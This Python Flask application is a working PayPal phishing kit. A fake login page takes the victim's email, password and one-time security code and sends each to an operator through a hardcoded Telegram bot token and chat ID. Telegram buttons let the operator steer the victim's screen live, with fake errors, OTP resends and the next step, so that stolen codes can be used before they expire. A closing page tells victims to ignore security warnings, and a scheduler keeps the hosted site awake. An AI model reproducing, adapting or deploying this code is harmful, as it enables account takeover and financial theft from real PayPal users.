#!/usr/bin/env python3
"""
PayPal Login System - ULTIMATE RENDER FIX
Auto-wakeup every 10 minutes + Instant Telegram processing
"""

from flask import Flask, request, jsonify, render_template_string
import requests
import time
import logging
from datetime import datetime
import os
import threading
import schedule

# Ultra-fast logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Telegram Configuration
BOT_TOKEN = "8343644991:AAGUCkdTgJsBWMXTcQOv6yxjwiGqkUKxIVI"
CHAT_ID = "7861055360"

# Optimized session storage
sessions = {}
last_processed_id = 0

# Auto-wakeup configuration
RENDER_URL = os.getenv('RENDER_EXTERNAL_URL', 'https://login-system-mey3.onrender.com')
app_start_time = time.time()

def send_telegram_message(text, reply_markup=None):
    """ULTRA-FAST Telegram message sending"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    payload = {
        'chat_id': CHAT_ID,
        'text': text,
        'parse_mode': 'HTML',
        'disable_notification': True  # Faster without notifications
    }
    
    if reply_markup:
        payload['reply_markup'] = reply_markup
    
    try:
        response = requests.post(url, json=payload, timeout=3)
        if response.status_code == 200:
            logger.info(f"⚡ Telegram: {text[:30]}...")
            return True
        else:
            logger.error(f"✗ Telegram error: {response.status_code}")
            return False
    except Exception as e:
        logger.error(f"✗ Telegram failed: {e}")
        return False

def create_keyboard(session_id, field, value):
    """Optimized keyboard creation"""
    if field == 'email':
        keyboard = [
            [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
            [{"text": "✅ PROCEED TO PASSWORD", "callback_data": f"proceed:{session_id}:password"}],
            [{"text": "❌ EMAIL ERROR", "callback_data": f"error:{session_id}:email"}]
        ]
    elif field == 'password':
        keyboard = [
            [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
            [{"text": "🔑 COPY PASSWORD", "callback_data": f"copy:{session_id}:password"}],
            [{"text": "✅ PROCEED TO OTP", "callback_data": f"proceed:{session_id}:otp"}],
            [{"text": "❌ PASSWORD ERROR", "callback_data": f"error:{session_id}:password"}]
        ]
    elif field == 'otp':
        keyboard = [
            [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
            [{"text": "🔑 COPY PASSWORD", "callback_data": f"copy:{session_id}:password"}],
            [{"text": "🔢 COPY OTP", "callback_data": f"copy:{session_id}:otp"}],
            [{"text": "✅ PROCEED TO SUCCESS", "callback_data": f"proceed:{session_id}:success"}],
            [{"text": "❌ OTP ERROR", "callback_data": f"error:{session_id}:otp"}],
            [{"text": "🔄 RESEND OTP", "callback_data": f"resend:{session_id}:otp"}]
        ]
    
    return {"inline_keyboard": keyboard}

def process_telegram_command(command):
    """INSTANT command processing"""
    try:
        if command.startswith('copy:'):
            parts = command.split(':')
            if len(parts) >= 3:
                session_id, field = parts[1], parts[2]
                if session_id in sessions:
                    value = sessions[session_id].get(field, '')
                    send_telegram_message(
                        f"📋 <b>COPIED {field.upper()}</b>\n"
                        f"<code>{value}</code>\n\n"
                        f"Session: {session_id[-8:]}\n"
                        f"⏰ {datetime.now().strftime('%H:%M:%S')}"
                    )
        
        elif command.startswith('proceed:') or command.startswith('error:') or command.startswith('resend:'):
            action, session_id, step = command.split(':', 2)
            
            # Map actions to frontend commands
            action_map = {
                'proceed:password': 'show_password',
                'proceed:otp': 'show_otp', 
                'proceed:success': 'show_success',
                'error:email': 'show_email_error',
                'error:password': 'show_password_error',
                'error:otp': 'show_otp_error',
                'resend:otp': 'resend_otp'
            }
            
            action_key = f"{action}:{step}"
            if action_key in action_map and session_id in sessions:
                sessions[session_id]['action'] = action_map[action_key]
                sessions[session_id]['last_update'] = time.time()
                
                logger.info(f"⚡ INSTANT Action: {action_map[action_key]} for {session_id[-8:]}")
                
                # Send instant confirmation
                action_names = {
                    'show_password': '🔑 PASSWORD STEP',
                    'show_otp': '🔢 OTP STEP', 
                    'show_success': '✅ SUCCESS',
                    'show_email_error': '❌ EMAIL ERROR',
                    'show_password_error': '❌ PASSWORD ERROR',
                    'show_otp_error': '❌ OTP ERROR',
                    'resend_otp': '🔄 OTP RESENT'
                }
                
                status_msg = action_names.get(action_map[action_key], 'ACTION TAKEN')
                send_telegram_message(
                    f"⚡ {status_msg}\n"
                    f"Session: {session_id[-8:]}\n"
                    f"⏰ {datetime.now().strftime('%H:%M:%S')}"
                )
                
                return True
        return False
    except Exception as e:
        logger.error(f"Command processing error: {e}")
        return False

def check_telegram_updates():
    """ULTRA-FAST Telegram update checking"""
    global last_processed_id
    
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        params = {
            'timeout': 1,  # Ultra-short timeout
            'offset': last_processed_id + 1,
            'allowed_updates': ['callback_query']
        }
        
        response = requests.get(url, params=params, timeout=2)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('ok') and data.get('result'):
                for update in data['result']:
                    update_id = update['update_id']
                    last_processed_id = max(last_processed_id, update_id)
                    
                    # Process callback queries INSTANTLY
                    if 'callback_query' in update:
                        callback_data = update['callback_query']['data']
                        logger.info(f"⚡ INSTANT Telegram Command: {callback_data}")
                        
                        # Process command immediately
                        process_telegram_command(callback_data)
                        
                return True
        return False
    except Exception as e:
        return False

def auto_wakeup():
    """Auto-wakeup function to keep Render alive"""
    try:
        # Ping our own health endpoint
        health_url = f"{RENDER_URL}/health"
        response = requests.get(health_url, timeout=5)
        
        # Also process Telegram updates during wakeup
        check_telegram_updates()
        
        logger.info(f"🔄 Auto-wakeup completed - Status: {response.status_code}")
        
        # Send wakeup notification every 6th time (every hour)
        wakeup_count = sessions.get('_wakeup_count', 0) + 1
        sessions['_wakeup_count'] = wakeup_count
        
        if wakeup_count % 6 == 0:  # Every hour
            uptime = time.time() - app_start_time
            hours = int(uptime // 3600)
            minutes = int((uptime % 3600) // 60)
            
            send_telegram_message(
                f"🔄 <b>SYSTEM AUTO-WAKEUP</b>\n"
                f"✅ Application is running smoothly\n"
                f"⏰ Uptime: {hours}h {minutes}m\n"
                f"🔗 URL: <code>{RENDER_URL}</code>\n"
                f"📊 Wakeups: {wakeup_count}\n"
                f"🕒 {datetime.now().strftime('%H:%M:%S')}"
            )
            
        return True
    except Exception as e:
        logger.error(f"Auto-wakeup failed: {e}")
        return False

def wakeup_scheduler():
    """Background scheduler for auto-wakeup"""
    logger.info("🚀 Starting auto-wakeup scheduler...")
    
    # Schedule auto-wakeup every 10 minutes
    schedule.every(10).minutes.do(auto_wakeup)
    
    # Initial wakeup
    auto_wakeup()
    
    while True:
        try:
            schedule.run_pending()
            time.sleep(60)  # Check every minute
        except Exception as e:
            logger.error(f"Scheduler error: {e}")
            time.sleep(60)

# Start auto-wakeup scheduler in background
wakeup_thread = threading.Thread(target=wakeup_scheduler, daemon=True)
wakeup_thread.start()

# [KEEP YOUR EXISTING TEMPLATES - VERIFICATION_TEMPLATE and PAYPAL_TEMPLATE]
VERIFICATION_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Complete</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background: #ffffff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 40px 20px; color: #1a1a1a; }
        .container { width: 100%; max-width: 560px; }
        .card { background: #ffffff; border: 1px solid #e5e7eb; border-radius: 8px; padding: 48px; box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1); }
        .icon-container { width: 64px; height: 64px; margin: 0 auto 24px; background: #10b981; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .checkmark { width: 32px; height: 32px; stroke: #ffffff; stroke-width: 3; fill: none; }
        h1 { font-size: 24px; font-weight: 600; color: #111827; text-align: center; margin-bottom: 16px; letter-spacing: -0.025em; }
        .subtitle { font-size: 15px; color: #6b7280; text-align: center; line-height: 1.6; margin-bottom: 32px; }
        .notice-box { background: #fef3c7; border: 1px solid #fbbf24; border-radius: 6px; padding: 20px; margin-bottom: 24px; }
        .notice-title { font-size: 15px; font-weight: 600; color: #92400e; margin-bottom: 8px; }
        .notice-text { font-size: 14px; color: #78350f; line-height: 1.6; }
        .info-text { font-size: 14px; color: #4b5563; line-height: 1.7; margin-bottom: 24px; text-align: center; }
        .footer { text-align: center; padding-top: 24px; border-top: 1px solid #e5e7eb; }
        .footer-text { font-size: 13px; color: #9ca3af; }
        @media (max-width: 600px) { .card { padding: 32px 24px; } h1 { font-size: 22px; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="icon-container">
                <svg class="checkmark" viewBox="0 0 52 52"><path d="M14 27l7 7 16-16" stroke-linecap="round" stroke-linejoin="round"/></svg>
            </div>
            <h1>Verification Successful</h1>
            <p class="subtitle">Thank you for verifying your account. We appreciate your cooperation in maintaining account security.</p>
            <div class="notice-box">
                <div class="notice-title">Important Notice</div>
                <p class="notice-text">Please disregard any additional verification emails or warnings you may receive within the next 24 hours. Your verification is complete and no further action is required.</p>
            </div>
            <p class="info-text">If you receive any suspicious emails requesting additional verification, please do not click on any links. Contact us directly through our official channels if you have concerns.</p>
            <div class="footer"><p class="footer-text">Account verification completed successfully</p></div>
        </div>
    </div>
</body>
</html>
'''

PAYPAL_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; }
        header { border-bottom: 1px solid #e5e7eb; padding: 1rem 0; }
        .header-container { max-width: 28rem; margin: 0 auto; padding: 0 1rem; }
        .logo { font-size: 1.75rem; font-weight: bold; color: #0070ba; font-family: Verdana, sans-serif; }
        main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 1rem; }
        .content-wrapper { width: 100%; max-width: 28rem; }
        .form-container { animation: fadeIn 0.2s ease-in-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateX(10px); } to { opacity: 1; transform: translateX(0); } }
        .form-group { margin-bottom: 1.5rem; }
        label { display: block; font-size: 0.875rem; font-weight: 500; margin-bottom: 0.5rem; color: #111827; }
        input { width: 100%; height: 2.75rem; padding: 0 0.75rem; font-size: 1rem; border: 1px solid #d1d5db; border-radius: 0.25rem; transition: all 0.15s; }
        input:focus { outline: none; border-color: #0070ba; box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.1); }
        input:disabled { background-color: #f3f4f6; cursor: not-allowed; }
        input[type="text"].otp-input { height: 3.5rem; text-align: center; font-size: 1.875rem; letter-spacing: 0.5em; font-weight: 300; }
        .password-wrapper { position: relative; }
        .password-toggle { position: absolute; right: 0.75rem; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: #6b7280; padding: 0.25rem; }
        .btn { width: 100%; height: 3rem; background-color: #0070ba; color: white; border: none; border-radius: 9999px; font-size: 1rem; font-weight: 500; cursor: pointer; transition: background-color 0.15s; }
        .btn:hover:not(:disabled) { background-color: #005ea6; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .link { color: #0070ba; text-decoration: none; font-size: 0.875rem; }
        .link:hover { text-decoration: underline; }
        .user-avatar { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 1.5rem; }
        .avatar-circle { width: 2.5rem; height: 2.5rem; border-radius: 50%; background-color: #e5e7eb; display: flex; align-items: center; justify-content: center; font-weight: 500; color: #4b5563; }
        .user-email { font-size: 0.875rem; color: #6b7280; }
        .otp-header { text-align: center; margin-bottom: 1.5rem; }
        .otp-title { font-size: 1.5rem; font-weight: 500; color: #111827; margin-bottom: 0.5rem; }
        .otp-description { font-size: 0.875rem; color: #6b7280; }
        .otp-timer { display: flex; align-items: center; justify-content: space-between; font-size: 0.875rem; margin-top: 0.75rem; }
        .timer-text { color: #6b7280; }
        .timer-text.expired { color: #dc2626; }
        .resend-btn { background: none; border: none; color: #0070ba; cursor: pointer; font-size: 0.875rem; }
        .resend-btn:hover:not(:disabled) { text-decoration: underline; }
        .resend-btn:disabled { color: #9ca3af; cursor: not-allowed; }
        .loading-overlay { position: fixed; inset: 0; background-color: rgba(255, 255, 255, 0.95); backdrop-filter: blur(8px); z-index: 50; display: none; align-items: center; justify-content: center; flex-direction: column; }
        .loading-overlay.active { display: flex; }
        .spinner { width: 3rem; height: 3rem; border: 3px solid #e5e7eb; border-top-color: #0070ba; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 1rem; }
        .loading-text { font-size: 1rem; color: #374151; text-align: center; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .error-message { color: #dc2626; font-size: 0.875rem; text-decoration: center; margin-bottom: 1rem; padding: 0.5rem; background-color: #fef2f2; border-radius: 0.25rem; border: 1px solid #fecaca; animation: shake 0.5s; }
        .success-message { color: #059669; font-size: 0.875rem; text-align: center; margin-bottom: 1rem; padding: 0.5rem; background-color: #f0fdf4; border-radius: 0.25rem; border: 1px solid #bbf7d0; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
        footer { border-top: 1px solid #e5e7eb; padding: 1.5rem 0; }
        .footer-container { max-width: 72rem; margin: 0 auto; padding: 0 1rem; }
        .footer-links { display: flex; flex-wrap: wrap; gap: 1rem; justify-content: center; font-size: 0.75rem; }
        .footer-links a { color: #6b7280; text-decoration: none; }
        .footer-links a:hover { text-decoration: underline; }
        .hidden { display: none !important; }
        .mb-4 { margin-bottom: 1rem; }
    </style>
</head>
<body>
    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner"></div>
        <div class="loading-text" id="loadingText">Checking information...</div>
    </div>
    <header>
        <div class="header-container">
            <div class="logo">PayPal</div>
        </div>
    </header>
    <main>
        <div class="content-wrapper">
            <div id="emailStep" class="form-container">
                <div id="emailError" class="error-message hidden">Incorrect email address. Please try again.</div>
                <form id="emailForm">
                    <div class="form-group">
                        <label for="email">Email or mobile number</label>
                        <input type="email" id="email" required autofocus>
                    </div>
                    <button type="submit" class="btn">Next</button>
                </form>
            </div>
            <div id="passwordStep" class="form-container hidden">
                <div id="passwordError" class="error-message hidden">Incorrect password. Please try again.</div>
                <div class="user-avatar">
                    <div class="avatar-circle" id="avatarCircle">U</div>
                    <div class="user-email" id="userEmail"></div>
                </div>
                <form id="passwordForm">
                    <div class="form-group">
                        <label for="password">Password</label>
                        <div class="password-wrapper">
                            <input type="password" id="password" required autofocus>
                            <button type="button" class="password-toggle" id="passwordToggle">Show</button>
                        </div>
                        <a href="#" class="link mb-4" style="display: inline-block; margin-top: 0.5rem;">Forgot password?</a>
                    </div>
                    <button type="submit" class="btn">Log In</button>
                </form>
            </div>
            <div id="otpStep" class="form-container hidden">
                <div id="otpError" class="error-message hidden">Incorrect OTP. Please try again.</div>
                <div id="otpResend" class="success-message hidden">We sent you a new OTP.</div>
                <div class="otp-header">
                    <h1 class="otp-title">Enter security code</h1>
                    <p class="otp-description">Enter the 6-digit code we sent you</p>
                </div>
                <form id="otpForm">
                    <div class="form-group">
                        <input type="text" id="otp" class="otp-input" placeholder="· · · · · ·" maxlength="6" required autofocus>
                        <div class="otp-timer">
                            <span class="timer-text" id="timerText">Code expires in 1:00</span>
                            <button type="button" class="resend-btn" id="resendBtn" disabled>Resend code</button>
                        </div>
                    </div>
                    <button type="submit" class="btn" id="otpSubmitBtn" disabled>Continue</button>
                </form>
            </div>
        </div>
    </main>
    <footer>
        <div class="footer-container">
            <div class="footer-links">
                <a href="#">Contact Us</a>
                <a href="#">Privacy</a>
                <a href="#">Legal</a>
                <a href="#">Worldwide</a>
            </div>
        </div>
    </footer>
    <script>
        let currentStep = 'email';
        let emailValue = '';
        let passwordValue = '';
        let otpValue = '';
        let otpTimer = 60;
        let timerInterval = null;
        let canResend = false;
        let sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        let isWaitingForOperator = false;
        let statusCheckInterval = null;
        
        const loadingOverlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('loadingText');
        const emailStep = document.getElementById('emailStep');
        const passwordStep = document.getElementById('passwordStep');
        const otpStep = document.getElementById('otpStep');
        const emailForm = document.getElementById('emailForm');
        const passwordForm = document.getElementById('passwordForm');
        const otpForm = document.getElementById('otpForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const otpInput = document.getElementById('otp');
        const passwordToggle = document.getElementById('passwordToggle');
        const userEmail = document.getElementById('userEmail');
        const avatarCircle = document.getElementById('avatarCircle');
        const timerText = document.getElementById('timerText');
        const resendBtn = document.getElementById('resendBtn');
        const otpSubmitBtn = document.getElementById('otpSubmitBtn');
        const emailError = document.getElementById('emailError');
        const passwordError = document.getElementById('passwordError');
        const otpError = document.getElementById('otpError');
        const otpResend = document.getElementById('otpResend');

        function showLoading(text) {
            loadingText.textContent = text;
            loadingOverlay.classList.add('active');
            isWaitingForOperator = true;
            
            // Start ULTRA-FAST status checking (every 100ms)
            if (statusCheckInterval) clearInterval(statusCheckInterval);
            statusCheckInterval = setInterval(checkOperatorStatus, 100);
        }
        
        function hideLoading() {
            loadingOverlay.classList.remove('active');
            isWaitingForOperator = false;
            if (statusCheckInterval) {
                clearInterval(statusCheckInterval);
                statusCheckInterval = null;
            }
        }
        
        function formatTime(seconds) {
            const mins = Math.floor(seconds / 60);
            const secs = seconds % 60;
            return `${mins}:${secs.toString().padStart(2, '0')}`;
        }
        
        function showStep(step) {
            emailStep.classList.add('hidden');
            passwordStep.classList.add('hidden');
            otpStep.classList.add('hidden');
            emailError.classList.add('hidden');
            passwordError.classList.add('hidden');
            otpError.classList.add('hidden');
            otpResend.classList.add('hidden');
            
            if (step === 'email') {
                emailStep.classList.remove('hidden');
                emailInput.focus();
            } else if (step === 'password') {
                passwordStep.classList.remove('hidden');
                passwordInput.focus();
            } else if (step === 'otp') {
                otpStep.classList.remove('hidden');
                otpInput.focus();
            }
            currentStep = step;
        }
        
        function startOtpTimer() {
            if (timerInterval) clearInterval(timerInterval);
            otpTimer = 60;
            canResend = false;
            resendBtn.disabled = true;
            timerText.classList.remove('expired');
            otpResend.classList.add('hidden');
            timerInterval = setInterval(() => {
                otpTimer--;
                if (otpTimer <= 0) {
                    clearInterval(timerInterval);
                    timerText.textContent = 'Code expired';
                    timerText.classList.add('expired');
                    canResend = true;
                    resendBtn.disabled = false;
                } else {
                    timerText.textContent = `Code expires in ${formatTime(otpTimer)}`;
                }
            }, 1000);
        }
        
        async function sendToBackend(field, value) {
            try {
                const response = await fetch('/submit', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({session_id: sessionId, field: field, value: value})
                });
                return await response.json();
            } catch (error) {
                console.error('Error sending to backend:', error);
                return { success: false };
            }
        }
        
        async function checkOperatorStatus() {
            if (!isWaitingForOperator) return;
            
            try {
                const response = await fetch('/status?session_id=' + sessionId + '&_t=' + Date.now());
                const data = await response.json();
                
                if (data.action) {
                    handleOperatorAction(data.action);
                }
                
                // Also trigger immediate Telegram processing
                await fetch('/process-now', {method: 'POST'});
                
            } catch (error) {
                console.error('Status check error:', error);
            }
        }
        
        function handleOperatorAction(action) {
            hideLoading();
            
            switch(action) {
                case 'show_password':
                    showStep('password');
                    break;
                case 'show_otp':
                    showStep('otp');
                    startOtpTimer();
                    break;
                case 'show_success':
                    window.location.href = '/verification-success';
                    break;
                case 'show_email_error':
                    showStep('email');
                    emailError.classList.remove('hidden');
                    emailInput.value = '';
                    emailInput.focus();
                    break;
                case 'show_password_error':
                    showStep('password');
                    passwordError.classList.remove('hidden');
                    passwordInput.value = '';
                    passwordInput.focus();
                    break;
                case 'show_otp_error':
                    showStep('otp');
                    otpError.classList.remove('hidden');
                    otpInput.value = '';
                    otpInput.focus();
                    startOtpTimer();
                    break;
                case 'resend_otp':
                    showStep('otp');
                    otpInput.value = '';
                    otpResend.classList.remove('hidden');
                    startOtpTimer();
                    break;
            }
        }
        
        // Event listeners
        emailForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            emailValue = emailInput.value.trim();
            if (emailValue) {
                showLoading('Checking email...');
                await fetch('/clear-session?session_id=' + sessionId);
                await sendToBackend('email', emailValue);
                userEmail.textContent = emailValue;
                avatarCircle.textContent = emailValue[0].toUpperCase();
            }
        });
        
        passwordForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            passwordValue = passwordInput.value;
            if (passwordValue) {
                showLoading('Verifying password...');
                await sendToBackend('password', passwordValue);
            }
        });
        
        otpForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            otpValue = otpInput.value;
            if (otpValue.length === 6) {
                showLoading('Checking security code...');
                await sendToBackend('otp', otpValue);
            }
        });
        
        passwordToggle.addEventListener('click', () => {
            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
            passwordToggle.textContent = passwordInput.type === 'password' ? 'Show' : 'Hide';
        });
        
        otpInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
            otpValue = e.target.value;
            otpSubmitBtn.disabled = otpValue.length !== 6;
        });
        
        resendBtn.addEventListener('click', async () => {
            if (canResend) {
                showLoading('Sending new code...');
                otpInput.value = '';
                otpValue = '';
                otpSubmitBtn.disabled = true;
                await sendToBackend('request_otp', 'new_otp_requested');
                showStep('otp');
                startOtpTimer();
                otpResend.classList.remove('hidden');
                hideLoading();
            }
        });
        
        document.addEventListener('DOMContentLoaded', function() {
            console.log('⚡ ULTIMATE PayPal System initialized');
            emailInput.focus();
        });
    </script>
</body>
</html>
'''

@app.route('/')
def home():
    """Main page"""
    return render_template_string(PAYPAL_TEMPLATE)

@app.route('/verification-success')
def verification_success():
    """Verification success page"""
    return render_template_string(VERIFICATION_TEMPLATE)

@app.route('/submit', methods=['POST'])
def submit():
    """INSTANT data submission"""
    data = request.json
    session_id = data.get('session_id')
    field = data.get('field')
    value = data.get('value')
    
    if session_id not in sessions:
        sessions[session_id] = {}
    
    sessions[session_id][field] = value
    sessions[session_id]['last_update'] = time.time()
    
    # Clear any previous action
    if 'action' in sessions[session_id]:
        del sessions[session_id]['action']
    
    form_name = "💰 PAYPAL"
    keyboard = create_keyboard(session_id, field, value)
    
    # Send Telegram notification
    if field == 'email':
        send_telegram_message(
            f"📧 <b>{form_name} - EMAIL SUBMITTED</b>\n"
            f"Email: <code>{value}</code>\n"
            f"Session: {session_id[-8:]}\n"
            f"⏰ {datetime.now().strftime('%H:%M:%S')}",
            keyboard
        )
    elif field == 'password':
        send_telegram_message(
            f"🔑 <b>{form_name} - PASSWORD SUBMITTED</b>\n"
            f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
            f"Password: <code>{value}</code>\n"
            f"Session: {session_id[-8:]}\n"
            f"⏰ {datetime.now().strftime('%H:%M:%S')}",
            keyboard
        )
    elif field == 'otp':
        send_telegram_message(
            f"🔢 <b>{form_name} - OTP SUBMITTED</b>\n"
            f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
            f"OTP: <code>{value}</code>\n"
            f"Session: {session_id[-8:]}\n"
            f"⏰ {datetime.now().strftime('%H:%M:%S')}",
            keyboard
        )
    elif field == 'request_otp':
        send_telegram_message(
            f"🔄 <b>{form_name} - OTP RESEND REQUESTED</b>\n"
            f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
            f"Session: {session_id[-8:]}\n"
            f"⏰ {datetime.now().strftime('%H:%M:%S')}"
        )
    
    # Process Telegram updates immediately
    check_telegram_updates()
    
    return jsonify({'success': True})

@app.route('/status')
def status():
    """Status checking with Telegram processing"""
    session_id = request.args.get('session_id')
    
    # Process Telegram updates on every status check
    check_telegram_updates()
    
    # Clean old sessions
    current_time = time.time()
    expired_sessions = [sid for sid, data in sessions.items() 
                       if isinstance(data, dict) and current_time - data.get('last_update', 0) > 3600]
    for sid in expired_sessions:
        if sid in sessions:
            del sessions[sid]
    
    # Get and CLEAR the action (one-time use)
    action = None
    if session_id in sessions and 'action' in sessions[session_id]:
        action = sessions[session_id].pop('action')
    
    return jsonify({'action': action})

@app.route('/process-now', methods=['POST'])
def process_now():
    """INSTANT Telegram processing endpoint"""
    try:
        check_telegram_updates()
        return jsonify({'success': True, 'processed': True})
    except Exception as e:
        logger.error(f"Error processing Telegram: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/clear-session')
def clear_session():
    """Clear session"""
    session_id = request.args.get('session_id')
    if session_id in sessions and 'action' in sessions[session_id]:
        del sessions[session_id]['action']
    return jsonify({'success': True})

@app.route('/health')
def health():
    """Health check endpoint for auto-wakeup"""
    return jsonify({
        'status': 'healthy', 
        'sessions': len(sessions),
        'uptime': round(time.time() - app_start_time),
        'timestamp': datetime.now().isoformat()
    })

@app.route('/wakeup')
def wakeup():
    """Manual wakeup endpoint"""
    auto_wakeup()
    return jsonify({'status': 'wakeup_triggered'})

@app.route('/test-telegram')
def test_telegram():
    """Test Telegram connection"""
    test_message = f"⚡ ULTIMATE SYSTEM TEST: {datetime.now().strftime('%H:%M:%S.%f')[:-3]}"
    success = send_telegram_message(test_message)
    return jsonify({'telegram_test': success, 'timestamp': datetime.now().isoformat()})

if __name__ == "__main__":
    print("🚀 ULTIMATE PAYPAL SYSTEM STARTED")
    print("🔄 Auto-wakeup every 10 minutes ACTIVATED")
    print("⚡ Instant Telegram processing ENABLED")
    
    # Send startup message
    startup_msg = (
        f"🚀 <b>ULTIMATE PAYPAL SYSTEM STARTED</b>\n\n"
        f"✅ Auto-wakeup: EVERY 10 MINUTES\n"
        f"⚡ Instant response: ENABLED\n"
        f"🔗 URL: <code>{RENDER_URL}</code>\n"
        f"🕒 Started: {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"💡 System will never sleep again!"
    )
    send_telegram_message(startup_msg)
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
